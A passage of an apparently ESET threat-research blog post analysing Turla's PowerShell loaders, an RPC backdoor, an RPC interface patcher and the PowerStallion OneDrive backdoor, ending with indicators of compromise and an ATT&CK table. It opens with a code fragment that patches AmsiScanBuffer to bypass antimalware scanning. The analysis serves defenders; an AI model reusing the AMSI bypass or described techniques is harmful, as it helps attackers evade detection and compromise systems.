class="crayon-cn">0x01</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">buf</span><span class="crayon-sy">[</span><span class="crayon-cn">2</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x00</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">buf</span><span class="crayon-sy">[</span><span class="crayon-cn">3</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x00</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">buf</span><span class="crayon-sy">[</span><span class="crayon-cn">4</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0x00</span><span class="crayon-sy">;</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">buf</span><span class="crayon-sy">[</span><span class="crayon-cn">5</span><span class="crayon-sy">]</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-cn">0xc3</span><span class="crayon-sy">;</span><span class="crayon-h">&nbsp;&nbsp;</span><span class="crayon-p">#mov eax, 1 ;ret;</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e579066373595-20"><span class="crayon-h">		</span><span class="crayon-sy">$</span><span class="crayon-v">c</span><span class="crayon-h"> </span><span class="crayon-o">=</span><span class="crayon-h"> </span><span class="crayon-sy">[</span><span class="crayon-v">System</span><span class="crayon-sy">.</span><span class="crayon-v">Runtime</span><span class="crayon-sy">.</span><span class="crayon-v">InteropServices</span><span class="crayon-sy">.</span><span class="crayon-v">Marshal</span><span class="crayon-sy">]</span><span class="crayon-o">::</span><span class="crayon-e">Copy</span><span class="crayon-sy">(</span><span class="crayon-sy">$</span><span class="crayon-v">buf</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">0</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-sy">$</span><span class="crayon-v">ptr</span><span class="crayon-sy">,</span><span class="crayon-h"> </span><span class="crayon-cn">6</span><span class="crayon-sy">)</span></div><div class="crayon-line" id="crayon-60a99b2e3e579066373595-21"><span class="crayon-h">	</span><span class="crayon-sy">}</span></div><div class="crayon-line crayon-striped-line" id="crayon-60a99b2e3e579066373595-22">&nbsp;</div><div class="crayon-line" id="crayon-60a99b2e3e579066373595-23"><span class="crayon-sy">}</span></div></div></td>
					</tr>
				</table>
			</div>
		</div>
<!-- [Format Time: 0.0780 seconds] -->
<p><em>Figure 6. Patching of AmsiScanBuffer function</em></p>
<h1><strong>Payloads</strong></h1>
<p>The PowerShell scripts we have presented are generic components used to load various payloads, such as an RPC Backdoor and a PowerShell backdoor.</p>
<h2>RPC backdoor</h2>
<p>Turla has developed a whole set of backdoors relying on the RPC protocol. These backdoors are used to perform lateral movement and take control of other machines in the local network without relying on an external C&amp;C server.</p>
<p>The features implemented are quite basic: file upload, file download and command execution via cmd.exe or PowerShell. However, the malware also supports the addition of plugins.</p>
<p>This RPC backdoor is split into two components: a server and a client. An operator will use the client component to execute commands on another machine where the server component exists, as summarized in Figure 7.</p>
<div id="attachment_126045" style="width: 1034px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2019/05/figure7-WM.png"><img class="wp-image-126045 size-large" src="/wp-content/uploads/2019/05/figure7-WM-1024x550.png" alt="" width="1024" height="550" srcset="https://www.welivesecurity.com/wp-content/uploads/2019/05/figure7-WM-1024x550.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2019/05/figure7-WM-300x161.png 300w, https://www.welivesecurity.com/wp-content/uploads/2019/05/figure7-WM-768x413.png 768w" sizes="(max-width: 1024px) 100vw, 1024px" /></a><p class="wp-caption-text"><i>Figure 7. RPC backdoor usage</i></p></div>
<p>For instance, the sample identified by the following SHA-1 hash <span style="font-family: courier new, courier, monospace;">EC54EF8D79BF30B63C5249AF7A8A3C652595B923</span> is a client version. This component opens the named pipe <span style="font-family: courier new, courier, monospace;">\\pipe\\atctl</span> with the protocol sequence being “<span style="font-family: courier new, courier, monospace;">ncacn_np</span>” via the <span style="font-family: courier new, courier, monospace;">RpcStringBindingComposeW</span> function. The sample can then send commands by calling the <span style="font-family: courier new, courier, monospace;">NdrClientCall2</span> function. The exported procedure <span style="font-family: courier new, courier, monospace;">HandlerW</span> , responsible for parsing the arguments, shows that it is also possible to try to impersonate an anonymous token or try to steal another’s process token just for the execution of a command.</p>
<p>Its server counterpart does the heavy lifting and implements the different commands. It first checks if the registry key value <span style="font-family: courier new, courier, monospace;">HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters\NullSessionPipes</span> contains “<span style="font-family: courier new, courier, monospace;">atctl</span>”. If so, the server sets the security descriptor on the pipe object to &#8220;<span style="font-family: courier new, courier, monospace;">S:(ML;;NW;;;S-1-16-0)</span>&#8221; via the <span style="font-family: courier new, courier, monospace;">SetSecurityInfo</span> function. This will make the pipe available to everyone (untrusted/anonymous integrity level).</p>
<p>The following image shows the corresponding <a href="https://docs.microsoft.com/en-us/windows/desktop/rpc/using-midl" target="_blank" rel="noopener">MIDL stub descriptor</a> and the similar syntax and interface ID.</p>
<div id="attachment_126046" style="width: 1034px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2019/05/figure8-WM.png"><img class="wp-image-126046 size-large" src="/wp-content/uploads/2019/05/figure8-WM-1024x322.png" alt="" width="1024" height="322" srcset="https://www.welivesecurity.com/wp-content/uploads/2019/05/figure8-WM-1024x322.png 1024w, https://www.welivesecurity.com/wp-content/uploads/2019/05/figure8-WM-300x94.png 300w, https://www.welivesecurity.com/wp-content/uploads/2019/05/figure8-WM-768x242.png 768w, https://www.welivesecurity.com/wp-content/uploads/2019/05/figure8-WM.png 1058w" sizes="(max-width: 1024px) 100vw, 1024px" /></a><p class="wp-caption-text"><i>Figure 8. RPC backdoor client’s MIDL on the left, server&#8217;s on the right<i></i></i></p></div>
<p>As mentioned previously, this backdoor also supports loading plugins. The server creates a thread that searches for files matching the following pattern <span style="font-family: courier new, courier, monospace;">lPH*.dll</span>. If such a file exists, it is loaded and its export function <span style="font-family: courier new, courier, monospace;">ModuleStart</span> is called. Among the various plugins we have located so far, one is able to steal recent files and files from USB thumb drives.</p>
<p>Many variants of this RPC backdoor are used in the wild. Among some of them, we have seen local proxies (using <span style="font-family: courier new, courier, monospace;">upnprpc</span> as the endpoint and <span style="font-family: courier new, courier, monospace;">ncalrpc</span> as the protocol sequence) and newer versions embedding <a href="https://github.com/EmpireProject/PSInject/blob/master/PowerShellRunner/PowerShellRunner.cs" target="_blank" rel="noopener">PowerShellRunner</a> to run scripts directly without using <span style="font-family: courier new, courier, monospace;">powershell.exe</span>.</p>
<h2>RPC Spoof Server</h2>
<p>During our research, we also discovered a portable executable with the embedded pdb path <span style="font-family: courier new, courier, monospace;">C:\Users\Devel\source\repos\RPCSpoofer\x64\Release_Win2016_10\RPCSpoofServerInstall.pdb</span> (SHA-1: <span style="font-family: courier new, courier, monospace;">9D1C563E5228B2572F5CA14F0EC33CA0DEDA3D57</span>).</p>
<p>The main purpose of this utility is to retrieve the RPC configuration of a process that has registered an interface. In order to find that kind of process, it iterates through the TCP table (via the <span style="font-family: courier new, courier, monospace;">GetTcpTable2</span> function) until it either finds the PID of the process that has opened a specific port, or retrieves the PID of the process that has opened a specific named pipe. Once this PID is found, this utility reads the remote process’ memory and tries to retrieve the registered RPC interface. The code for this, seen in Figure 9, seems ripped from this <a href="https://github.com/silverf0x/RpcView" target="_blank" rel="noopener">Github repository</a>.</p>
<div id="attachment_126047" style="width: 851px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2019/05/figure9-WM.png"><img class="wp-image-126047 size-full" src="/wp-content/uploads/2019/05/figure9-WM.png" alt="" width="841" height="588" srcset="https://www.welivesecurity.com/wp-content/uploads/2019/05/figure9-WM.png 841w, https://www.welivesecurity.com/wp-content/uploads/2019/05/figure9-WM-300x210.png 300w, https://www.welivesecurity.com/wp-content/uploads/2019/05/figure9-WM-768x537.png 768w" sizes="(max-width: 841px) 100vw, 841px" /></a><p class="wp-caption-text"><i>Figure 9. Snippet of code searching for the <span style="font-family: courier new, courier, monospace;"><i> .data</i></span> section of <span style="font-family: courier new, courier, monospace;"><i>rpcrt4.dll</i></span> in a remote process (Hex-Rays screenshot)</i></p></div>
<p>At first we were unsure how the retrieved information was used but then another sample, (SHA-1: <span style="font-family: courier new, courier, monospace;">B948E25D061039D64115CFDE74D2FF4372E83765</span>) helped us understand. As shown in Figure 10, this sample retrieves the RPC interface, unsets the flag to <span style="font-family: courier new, courier, monospace;">RPC_IF_ALLOW_SECURE_ONLY</span><strong>, </strong>and patches the “dispatch table” in memory using the <span style="font-family: courier new, courier, monospace;">WriteProcessMemory</span> function. Those operations would allow the sample to add its RPC functions to an already existing RPC interface. We believe it is stealthier to re-use an existing RPC interface than to create a custom one.</p>
<div id="attachment_126048" style="width: 652px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2019/05/figure10-WM.png"><img class="wp-image-126048 size-full" src="/wp-content/uploads/2019/05/figure10-WM.png" alt="" width="642" height="603" srcset="https://www.welivesecurity.com/wp-content/uploads/2019/05/figure10-WM.png 642w, https://www.welivesecurity.com/wp-content/uploads/2019/05/figure10-WM-300x282.png 300w" sizes="(max-width: 642px) 100vw, 642px" /></a><p class="wp-caption-text"><i>Figure 10. Snippet of code retrieving the RPC dispatch table of the current process (Hex-Rays screenshot)</i></p></div>
<h2>PowerStallion</h2>
<p>PowerStallion is a lightweight PowerShell backdoor using Microsoft OneDrive, a storage service in the cloud, as C&amp;C server. The credentials are hardcoded at the beginning of the script, as shown in Figure 11.</p>
<div id="attachment_126049" style="width: 511px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2019/05/figure11-WM.png"><img class="wp-image-126049 size-full" src="/wp-content/uploads/2019/05/figure11-WM.png" alt="" width="501" height="279" srcset="https://www.welivesecurity.com/wp-content/uploads/2019/05/figure11-WM.png 501w, https://www.welivesecurity.com/wp-content/uploads/2019/05/figure11-WM-300x167.png 300w, https://www.welivesecurity.com/wp-content/uploads/2019/05/figure11-WM-143x79.png 143w, https://www.welivesecurity.com/wp-content/uploads/2019/05/figure11-WM-298x165.png 298w, https://www.welivesecurity.com/wp-content/uploads/2019/05/figure11-WM-500x279.png 500w" sizes="(max-width: 501px) 100vw, 501px" /></a><p class="wp-caption-text"><i>Figure 11. OneDrive credentials in PowerStallion script</i></p></div>
<p>It is interesting to note that Turla operators used the free email provider GMX again, as in the <a href="https://www.welivesecurity.com/wp-content/uploads/2018/08/Eset-Turla-Outlook-Backdoor.pdf" target="_blank" rel="noopener">Outlook Backdoor</a> and in <a href="https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf" target="_blank" rel="noopener">LightNeuron</a>. They also used the name of a real employee of the targeted organization in the email address.</p>
<p>Then it uses a <span style="font-family: courier new, courier, monospace;">net use</span> command to connect to the network drive. It then checks, in a loop, as shown in Figure 12, if a command is available. This backdoor can only execute additional PowerShell scripts. It writes the command results in another OneDrive subfolder and encrypts it with the XOR key 0xAA.</p>
<div id="attachment_126050" style="width: 493px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2019/05/figure12-WM.png"><img class="wp-image-126050 size-full" src="/wp-content/uploads/2019/05/figure12-WM.png" alt="" width="483" height="555" srcset="https://www.welivesecurity.com/wp-content/uploads/2019/05/figure12-WM.png 483w, https://www.welivesecurity.com/wp-content/uploads/2019/05/figure12-WM-261x300.png 261w" sizes="(max-width: 483px) 100vw, 483px" /></a><p class="wp-caption-text"><i>Figure 12. Main loop of the PowerStallion backdoor</i></p></div>
<p>Another interesting artefact is that the script modifies the modification, access and creation (MAC) times of the local log file to match the times of a legitimate file – <span style="font-family: courier new, courier, monospace;">desktop.ini</span> in that example, as shown in Figure 13.</p>
<div id="attachment_126044" style="width: 822px" class="wp-caption aligncenter"><a href="/wp-content/uploads/2019/05/figure13-WM.png"><img class="wp-image-126044 size-full" src="/wp-content/uploads/2019/05/figure13-WM.png" alt="" width="812" height="434" srcset="https://www.welivesecurity.com/wp-content/uploads/2019/05/figure13-WM.png 812w, https://www.welivesecurity.com/wp-content/uploads/2019/05/figure13-WM-300x160.png 300w, https://www.welivesecurity.com/wp-content/uploads/2019/05/figure13-WM-768x410.png 768w" sizes="(max-width: 812px) 100vw, 812px" /></a><p class="wp-caption-text"><i>Figure 13. Modification of MAC times of the local log file</i></p></div>
<p>We believe this backdoor is a recovery access tool in case the main Turla backdoors, such as <a href="https://www.welivesecurity.com/2017/03/30/carbon-paper-peering-turlas-second-stage-backdoor/" target="_blank" rel="noopener">Carbon</a> or <a href="https://www.welivesecurity.com/wp-content/uploads/2017/08/eset-gazer.pdf" target="_blank" rel="noopener">Gazer</a>, are cleaned and operators can no longer access the compromised computers. We have seen operators use this backdoor for the following purposes:</p>
<ul>
<li>Monitoring antimalware logs.</li>
<li>Monitoring the Windows process list.</li>
<li>Installing ComRAT version 4, one of the Turla second-stage backdoors.</li>
</ul>
<h1>Conclusion</h1>
<p>In a <a href="https://www.welivesecurity.com/2018/05/22/turla-mosquito-shift-towards-generic-tools/" target="_blank" rel="noopener">2018 blogpost</a>, we predicted that Turla would use more and more generic tools. This new research confirms our forecast and shows that the Turla group does not hesitate to use open-source pen-testing frameworks to conduct intrusion.</p>
<p>However, it does not prevent attributing such attacks to Turla. Attackers tend to configure or modify those open-source tools to better suit their needs. Thus, it is still possible to separate different clusters of activities.</p>
<p>Finally, the usage of open-source tools does not mean Turla has stopped using its custom tools. The payloads delivered by the PowerShell scripts, the RPC backdoor and PowerStallion, are actually very customized. Our recent analysis of <a href="https://www.welivesecurity.com/wp-content/uploads/2019/05/ESET-LightNeuron.pdf" target="_blank" rel="noopener">Turla LightNeuron</a> is additional proof that this group is still developing complex, custom malware.</p>
<p>We will continue monitoring new Turla activities and will publish relevant information on our blog. <em>For any inquiries, contact us as <a href="mailto:threatintel@eset.com">threatintel@eset.com</a>. Indicators of Compromise can also be found on our <a href="https://github.com/eset/malware-ioc/tree/master/turla#turla-powershell-indicators-of-compromise" target="_blank" rel="noopener">GitHub</a>.</em></p>
<h1>Indicators of Compromise (IoCs)</h1>
<h2>Hashes</h2>

<table id="tablepress-696" class="tablepress tablepress-id-696">
<thead>
<tr class="row-1 odd">
	<th class="column-1">SHA-1 hash</th><th class="column-2">Description</th><th class="column-3">ESET detection name</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">50C0BF9479EFC93FA9CF1AA99BDCA923273B71A1</td><td class="column-2">PowerShell loader with encrypted payload</td><td class="column-3">PowerShell/Turla.T</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">EC54EF8D79BF30B63C5249AF7A8A3C652595B923</td><td class="column-2">RPC backdoor (client)</td><td class="column-3">Win64/Turla.BQ</td>
</tr>
<tr class="row-4 even">
	<td class="column-1">9CDF6D5878FC3AECF10761FD72371A2877F270D0</td><td class="column-2">RPC backdoor (server)</td><td class="column-3">Win64/Turla.BQ</td>
</tr>
<tr class="row-5 odd">
	<td class="column-1">D3DF3F32716042404798E3E9D691ACED2F78BDD5</td><td class="column-2">File exfiltration RPC plugin</td><td class="column-3">Win32/Turla.BZ</td>
</tr>
<tr class="row-6 even">
	<td class="column-1">9D1C563E5228B2572F5CA14F0EC33CA0DEDA3D57</td><td class="column-2">RPCSpoofServerInstaller</td><td class="column-3">Win64/Turla.BS</td>
</tr>
<tr class="row-7 odd">
	<td class="column-1">B948E25D061039D64115CFDE74D2FF4372E83765</td><td class="column-2">RPC interface patcher</td><td class="column-3">Win64/Turla.BR</td>
</tr>
</tbody>
</table>

<h2>Filenames</h2>
<ul>
<li>RPC components
<ul>
<li><span style="font-family: courier new, courier, monospace;">%PUBLIC%\iCore.dat</span> (log file, one-byte XOR 0x55)</li>
<li><span style="font-family: courier new, courier, monospace;">\\pipe\\atctl</span> (named pipe)</li>
</ul>
</li>
<li>PowerStallion
<ul>
<li><span style="font-family: courier new, courier, monospace;">msctx.ps1</span></li>
<li><span style="font-family: courier new, courier, monospace;">C:\Users\Public\Documents\desktop.db</span></li>
</ul>
</li>
</ul>
<h2>Registry keys</h2>
<ul>
<li>RPC components
<ul>
<li><span style="font-family: courier new, courier, monospace;">HKLM\SYSTEM\CurrentControlSet\services\LanmanServer\Parameters\NullSessionPipes</span> contains <span style="font-family: courier new, courier, monospace;">atctl</span></li>
</ul>
</li>
</ul>
<h2>MITRE ATT&amp;CK techniques</h2>

<table id="tablepress-697" class="tablepress tablepress-id-697">
<thead>
<tr class="row-1 odd">
	<th class="column-1">Tactic</th><th class="column-2">ID</th><th class="column-3">Name</th><th class="column-4">Description</th>
</tr>
</thead>
<tbody class="row-hover">
<tr class="row-2 even">
	<td class="column-1">Execution</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1086/" rel="noopener" target="_blank">T1086</a></td><td class="column-3">PowerShell</td><td class="column-4">The loaders are written in PowerShell.<br />
Some RPC components can execute PowerShell commands.</td>
</tr>
<tr class="row-3 odd">
	<td class="column-1">Persistence</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1084/" rel="noopener" target="_blank">T1084</a></td><td class="column-3">Windows Management Instrumentation Event Subscription</td><td class="column-4">The PowerShell loaders use WMI for persistence.</td>
</tr>
<tr class="row-4 even">
	<td rowspan="4" class="column-1">Defense Evasion</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1027/" rel="noopener" target="_blank">T1027</a></td><td class="column-3">Obfuscated Files or Information</td><td class="column-4">The RPC backdoor and PowerStallion encrypt the log file.</td>
</tr>
<tr class="row-5 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1140/" rel="noopener" target="_blank">T1140</a></td><td class="column-3">Deobfuscate/Decode Files or Information</td><td class="column-4">The PowerShell loaders decrypt the embedded payload.</td>
</tr>
<tr class="row-6 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1055/" rel="noopener" target="_blank">T1055</a></td><td class="column-3">Process Injection</td><td class="column-4">The PowerShell loaders inject the payload into a remote process.</td>
</tr>
<tr class="row-7 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1099/" rel="noopener" target="_blank">T1099</a></td><td class="column-3">Timestomp</td><td class="column-4">PowerStallion modifies the timestamps of its log file.</td>
</tr>
<tr class="row-8 even">
	<td rowspan="4" class="column-1">Discovery</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1083/" rel="noopener" target="_blank">T1083</a></td><td class="column-3">File and Directory Discovery</td><td class="column-4">The RPC plugin gathers file and directory information.</td>
</tr>
<tr class="row-9 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1120/" rel="noopener" target="_blank">T1120</a></td><td class="column-3">Peripheral Device Discovery</td><td class="column-4">The RPC plugin monitors USB drives.</td>
</tr>
<tr class="row-10 even">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1012/" rel="noopener" target="_blank">T1012</a></td><td class="column-3">Query Registry</td><td class="column-4">The server component of the RPC backdoor queries the registry for NullSessionPipes.</td>
</tr>
<tr class="row-11 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1057/" rel="noopener" target="_blank">T1057</a></td><td class="column-3">Process Discovery</td><td class="column-4">PowerStallion sent the list of running processes.</td>
</tr>
<tr class="row-12 even">
	<td rowspan="2" class="column-1">Collection</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1005/" rel="noopener" target="_blank">T1005</a></td><td class="column-3">Data from Local System</td><td class="column-4">The RPC plugin collects recent files from the local file system.</td>
</tr>
<tr class="row-13 odd">
	<td class="column-2"><a href="https://attack.mitre.org/techniques/T1025/" rel="noopener" target="_blank">T1025</a></td><td class="column-3">Data from Removable Media</td><td class="column-4">The RPC plugin collects files from USB drives.</td>
</tr>
<tr class="row-14 even">
	<td class="column-1">Command and Control</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1071/" rel="noopener" target="_blank">T1071</a></td><td class="column-3">Standard Application Layer Protocol</td><td class="column-4">The RPC backdoor uses RPC and PowerStallion uses OneDrive via SMB.</td>
</tr>
<tr class="row-15 odd">
	<td class="column-1">Exfiltration</td><td class="column-2"><a href="https://attack.mitre.org/techniques/T1041/" rel="noopener" target="_blank">T1041</a></td><td class="column-3">Exfiltration Over Command and Control Channel</td><td class="column-4">PowerStallion exfiltrates information through the C&amp;C channel.</td>
</tr>
</tbody>
</table>


                            
                                                            <div class="dot">
                                    <span class="icomoon icon-icon_article_dot"></span>
                                </div>

                                <div class="meta">
                                    <div class="wls-authors wls-authors-footer">
                                                <div class="wls-author">
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/mfaou/" title="Matthieu Faou">
                    Matthieu Faou                </a>
            </div>
        </div>
                <div class="wls-author">
                        <div class="wls-author-name">
                <a href="https://www.welivesecurity.com/author/romaindupont/" title="Romain Dumont">
                    Romain Dumont                </a>
            </div>
        </div>
                                            </div>
                                    <span class="strong">
								        <time datetime="2019-05-29 11:30:29">29 May 2019 - 11:30AM</time>
                                    </span>
                                </div>
                            
                            <div class="widgets row">
                                <div class="col-md-12 col-sm-12 col-xs-12">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12 no-padding">
                                        <h3><span class="text">Newsletter</span></h3>
                                    </div>
                                </div>
                                <div class="col-md-6 col-sm-6 col-xs-12 newsletter-wrapper">
                                    		<div class="heading-line col-md-12 no-padding sidebar-item clearfix">
			<h3>
				<span class="text">Newsletter</span>
			</h3>

			<form action="https://enjoy.eset.com/pub/rf" class="basic-searchform col-md-12 col-sm-12 col-xs-12 no-padding newsletter" method="post" role="search">
				<div class="search-input clearfix">
                    <input type="text" name="EMAIL_ADDRESS_" value="" placeholder="Email...">
                    <input type="hidden" name="NEWSLETTER" value="We Live Security">

                    <input type="hidden" name="_ri_" value="X0Gzc2X%3DAQpglLjHJlTQGgXv4jDGEK4KW2uhw0qgUzfwuivmOJOPCgzgo9vsI3VwjpnpgHlpgneHmgJoXX0Gzc2X%3DAQpglLjHJlTQGzbD6yU2pAgzaJM16bkTA7tOwuivmOJOPCgzgo9vsI3">
                    <input type="hidden" name="_ei_" value="Ep2VKa8UKNIAPP_2GAEW0bY">
                    <input type="hidden" name="_di_" value="m0a5n0j02duo9clmm4btuu5av8rdtvqfqd03v1hallrvcob47ad0">
                    <input type="hidden" name="EMAIL_PERMISSION_STATUS_" value="O">
                    <input type="hidden" name="CONTACT_SOURCE_MOST_RECENT" value="WLS_Subscribe_Form">
                    <button>
						Submit					</button>
				</div>
			</form>
		</div>
                                </div>
                            </div>

                                                            <div class="similar-articles row">
                                    <div class="heading-line col-md-12 col-sm-12 col-xs-12">
                                        <h3><span class="text">Similar Articles</span></h3>
                                    </div>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/cybersecurity/" class="category-tag-btn">Cybersecurity</a>                                                <a href="https://www.welivesecurity.com/2021/05/12/eset-research-rsa-conference-2021-presentations/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/05/eset-research-rsa2021-conference-preview-623x415.jpg"
                                                         alt="A dive into Turla PowerShell usage">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/05/12/eset-research-rsa-conference-2021-presentations/">
                                                    ESET Research goes to RSA Conference 2021 with two presentations                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/05/05/ousaban-private-photo-collection-hidden-cabinet/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/05/ousaban-banking-trojan-brazil-eset-research-623x415.jpg"
                                                         alt="A dive into Turla PowerShell usage">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/05/05/ousaban-private-photo-collection-hidden-cabinet/">
                                                    Ousaban: Private photo collection hidden in a CABinet                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/04/14/fbi-removes-malware-compromised-exchange-servers/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/04/fbi-removing-malware-exchange-server-623x415.jpg"
                                                         alt="A dive into Turla PowerShell usage">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/04/14/fbi-removes-malware-compromised-exchange-servers/">
                                                    FBI removes web shells from compromised Exchange servers                                                </a>
                                            </h4>
                                        </article>
                                                                            <article class="col-md-3 col-sm-3 col-xs-3">
                                            <div class="img-wrapper">
                                                <a href="https://www.welivesecurity.com/category/malware/" class="category-tag-btn">Malware</a>                                                <a href="https://www.welivesecurity.com/2021/04/08/are-you-afreight-dark-watch-out-vyveva-new-lazarus-backdoor/"
                                                   class="related-article-thumb">
                                                    <img class="col-xs-12 no-padding clickable"
                                                         src="https://www.welivesecurity.com/wp-content/uploads/2021/04/lazarus-vyveva-backdoor-south-africa-623x432.jpg"
                                                         alt="A dive into Turla PowerShell usage">
                                                </a>
                                            </div>
                                            <h4>
                                                <a href="https://www.welivesecurity.com/2021/04/08/are-you-afreight-dark-watch-out-vyveva-new-lazarus-backdoor/">
                                                    (Are you) afreight of the dark? Watch out for Vyveva, new Lazarus backdoor                                                </a>
                                            </h4>
                                        </article>
                                                                    </div>
                            
                            <div class="comments row">
                                <div class="heading-line col-xs-12">
                                    <h3><span class="text">Discussion</span></h3>
                                                                            
<div id="disqus_thread"></div>
                                                                    </div>
                            </div>
                        </div>
                    </div>
                </div>
            </div>
        </section>
    	</div> 	<footer id="site-footer">
		<div class="container">
			<div class="row">
				<div class="col-md-2">
                    <div class="hidden-sm hidden-xs">
                        <div class="logo-wrapper footer clearfix">
                            <div class="dark clearfix">
                                <a href="https://www.welivesecurity.com/" class="wls">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-1.svg" alt="Welivesecurity.com">
                                </a>
                                <a href="https://www.eset.com" class="eset">
                                    <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-footer-2.svg" alt="by ESET">
                                </a>
                            </div>
                        </div>
                    </div>
                    <div class="hidden-lg hidden-md">
                        <div class="logo-wrapper clearfix">
    <div class="dark clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-dark-header-2.svg" alt="by ESET">
        </a>
    </div>
    <div class="light clearfix">
        <a href="https://www.welivesecurity.com/" class="wls">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-1.svg" alt="Welivesecurity.com">
        </a>
        <a href="https://www.eset.com" class="eset">
            <img src="https://www.welivesecurity.com/wp-content/themes/eset-wls-2018/assets/img/new-logo/eset-wls-light-header-2.svg" alt="by ESET">
        </a>
    </div>
</div>                    </div>
				</div>
				<nav id="footer" class="clearfix">
											<div class="mobile-block">
																<div class="col-md-2 col-md-offset-2">
										<ul>
																							<li>
													<a href="/">Home</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/about-us/">About Us</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/contact-us/">Contact Us</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/sitemap/">Sitemap</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/our-experts/">Our Experts</a>
												</li>
																							<li>
													<a href="https://eset.com">ESET</a>
												</li>
																					</ul>
									</div>
													</div>
											<div class="mobile-block">
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/research/">Research</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/category/how-to/">How To</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/categories/">Categories</a>
												</li>
																					</ul>
									</div>
																<div class="col-md-2 ">
										<ul>
																							<li>
													<a href="https://www.welivesecurity.com/rss-configurator/">RSS Configurator</a>
												</li>
																							<li>
													<a href="https://www.welivesecurity.com/news-widget-generator/">News Widget</a>
												</li>
																					</ul>
									</div>
													</div>
									</nav>
			</div>
			<div class="row">
				<div class="col-md-12 legal clearfix">
					<div class="wrap clearfix">
													<span>
								<a href="https://www.welivesecurity.com/privacy/">
									Privacy Policy								</a>
							</span>
													<span>
								<a href="https://www.welivesecurity.com/legal-information/">
									Legal Information								</a>
							</span>
											</div>
					<span class="copyright pull-right">Copyright &copy; ESET, All Rights Reserved</span>
				</div>
							</div>
		</div>
	</footer>
	
	<button id="back-to-top" class="animated-scroll" data-target="absoluteTop">
		<span class="icomoon icon-icon_arrow"></span>
		<span class="text">Back to top</span>
	</button>

